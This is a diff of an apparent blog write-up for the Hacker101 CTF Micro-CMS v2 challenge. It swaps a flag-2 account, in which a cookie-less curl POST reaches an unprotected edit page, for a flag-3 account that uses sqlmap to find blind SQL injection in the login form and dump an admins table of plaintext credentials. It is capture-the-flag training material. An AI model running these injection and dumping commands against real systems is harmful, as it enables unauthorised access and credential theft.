@@ -1,80 +1,91 @@
 ---
-title: Hacker 101 CTF Micro-CMS v2 - Flag 2
+title: Hacker 101 CTF Micro-CMS v2 - Flag 3
 published: true
 ---
 
-Following on from [flag 1](https://ruddles.github.io/Hacker101-CTF-Micro-CMS-v2-flag-1); this is a writeup of flag 2 in [Hacker 101 CTF](https://ctf.hacker101.com/) Micro-CMS v2. If you're looking to follow along then I assume you're all logged in and have hit Go on the challenge.
+Following on from [flag 1](https://ruddles.github.io/Hacker101-CTF-Micro-CMS-v2-flag-1) and [flag2](https://ruddles.github.io/Hacker101-CTF-Micro-CMS-v2-flag-2) this is a writeup of the final flag in [Hacker 101 CTF](https://ctf.hacker101.com/) Micro-CMS v2. If you're looking to follow along then I assume you're all logged in and have hit Go on the challenge.
 
-# Finding a vulnerability
+# Finding a the final vulnerability
 
-After completing flag one I spent some time clicking around mapping out the site (that didn't take long) and doing some basic dir busting to see if I could find anything interesting. Long story short, I didn't find anything of note, so back to looking at the obvious pages.
+At this point I've had a lot of time to dig around in the front end and can't think of anything else to try there, so let's have a dig in the database.
 
-Digging around in the markdown section to see if there are any injection points I could attack (there's a good post on some attack vectors [here](https://medium.com/taptuit/exploiting-xss-via-markdown-72a61e774bf8)), it looks like there's fairly good input sanitisation now. Another dead end.
+# sqlmap
 
-So, going back to clicking around the site I had a thought. We can see the `GET` requests are protected with a login page, what about the `POST` requests? There's 2 on the site:
+If you've not come across it before, [sqlmap](https://sqlmap.org/) is a tool that automates finding and exploiting sql injection vulns.  Given we are exploiting a non-reflected (AKA blind) injection vuln (i.e. the results of the injection are not shown in the UI) then we either need to script something ourselves or use a tool. In this case sqlmap is very powerful but the docs aren't the best.  Let's have a play:
 
-- Creating a page
-- Editing a page.
+# Getting a request payload
 
-# Posting to Create
+The first thing we'll need is a request payload in a format that sqlmap understands.  In chrome, make sure you've got dev tools open on the login page, then enter any old junk in the username and password fields and click "Log In".
 
-Usually I'd do something like this with burp suit, however I'm currently trying out kali on WSL2, so until later this year there's no easy way to get UI up and running. Instead I'm browsing in windows and using the tools in the WSL2 instance. So no burp, however the network tab in chome dev tools should do it.
+Now in the network tab we can right-click and select `Copy request headers` and paste the contents into a new file (I called mine "request.txt").  Then go back to the network tab and down in the Form Data area select `view source` and copy the payload.
 
-The first thing to do is to log in (see my previous post on how to do this) and navigate to the create page at `/page/create/`. Open the dev tools in chrome (`F12`) and go to the network tab. I usually tick the "Preserve log" option at the top so redirects don't wipe the results out. Finally fill in some details and submit the page.
+![login error]({{ site.url }}/assets/post-images/h101-cms-v2/LoginCopy.png)
 
-Now we have a payload we can right click on the post in the network tab and select "Copy as cURL (bash)"
+So the contents of the file looks something like this (with a different URL on the first line...):
 
-![Create page]({{ site.url }}/assets/post-images/h101-cms-v2/CreatePage.png)
+```
+POST /83aa39a35a/login HTTP/1.1
+Host: 35.190.155.168
+Connection: keep-alive
+Content-Length: 27
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://35.190.155.168
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-GPC: 1
+Referer: http://35.190.155.168/83aa39a35a/login
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: l2session=eyJhZG1pbiI6dHJ1ZX0.YJlkcg.ZOb4OMIethVS0zf62YyVTrw6Ong
 
-Now I tend to paste this into a text editor (I use vscode for everything) to make editing a bit easier.
-
-This request is of course logged in, and we want to test if the same request still worked logged out. All we need to do is delete the line starting `-H 'Cookie:` so we're no longer logged in on the request and paste it into the terminal and hit enter:
-
-```bash
-curl 'http://35.190.155.168/90bf00b6e6/page/create' \
-  -H 'Connection: keep-alive' \
-  -H 'Cache-Control: max-age=0' \
-  -H 'Upgrade-Insecure-Requests: 1' \
-  -H 'Origin: http://35.190.155.168' \
-  -H 'Content-Type: application/x-www-form-urlencoded' \
-  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36' \
-  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
-  -H 'Sec-GPC: 1' \
-  -H 'Referer: http://35.190.155.168/90bf00b6e6/page/create' \
-  -H 'Accept-Language: en-US,en;q=0.9' \
-  --data-raw 'title=Test&body=Something+in+here' \
-  --compressed \
-  --insecure
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
-<title>Redirecting...</title>
-<h1>Redirecting...</h1>
-<p>You should be redirected automatically to target URL: <a href="/login">/login</a>.  If not click the link.%
+username=user&password=pass
 ```
 
-Nope, that's protected. Moving on....
+# Testing the username field
 
-# Editing a page
+Now we're ready to run some tests.  In this first one we're going to get sqlmap to test the username parameter of the request we saved in request.txt.  The `-r` flag is the path to the request file we created, and the `-p` flag is the parameter to test:
 
-Just like before: we're logged in, create the request, copy it, remove the cookie line and paste it into the terminal:
+`sqlmap -r ./request.txt -p username`
+
+After running this we can see that the username field is vulnerable and that that we're working with MySQL >= 5.0 (MariaDB fork) and some details about the back end OS.  A little scary how much can be picked up here.
+
+# Enumerating the databases
+
+Next up we can use the `--dbs` command to get back a list of all the tables in the DB:
+
+`sqlmap -r ./request.txt -p username --dbs`
+
+This gives us 4 databases on the server that we can access:
+- information_schema
+- level2
+- mysql
+- performance_schema
+
+# Enumerating the tables
+
+That level2 database looks interesting.  We can use the `-D` flag to select that database, then use the `--tables` flag to list out the tables in that DB:
+
+`sqlmap -r ./request.txt -p username -D level2 --tables`
+
+Running this gives us 2 tables:
 
 ```bash
-curl 'http://35.190.155.168/bf98748dfa/page/edit/4' \
-  -H 'Connection: keep-alive' \
-  -H 'Cache-Control: max-age=0' \
-  -H 'Upgrade-Insecure-Requests: 1' \
-  -H 'Origin: http://35.190.155.168' \
-  -H 'Content-Type: application/x-www-form-urlencoded' \
-  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36' \
-  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
-  -H 'Sec-GPC: 1' \
-  -H 'Referer: http://35.190.155.168/bf98748dfa/page/edit/4' \
-  -H 'Accept-Language: en-US,en;q=0.9' \
-  --data-raw 'title=test&body=something+else+in+here' \
-  --compressed \
-  --insecure
-^FLAG^FLAG_HASH_HERE$FLAG$%
+Database: level2
+[2 tables]
++--------+
+| admins |
+| pages  |
++--------+
 ```
 
-And that gives us a flag. Looks like the edit page wasn't correctly protected. One more flag to go on this challenge.
+# Dumping the table contents
+
+OK, that admin table looks like a good candidate.  We can use the `-T` flag to select that table and the `--dump` flag to dump the contents to the console.
+
+`sqlmap -r ./request.txt -p username -D level2 -T admins --dump`
+
+I won't post the output here but that's given me a table with a username and a plaintext password.  Logging in to the site with those credentials gives me the final flag.
 
 Any comments or suggestions? Chat with me on [twitter](https://twitter.com/RuddlesDev)
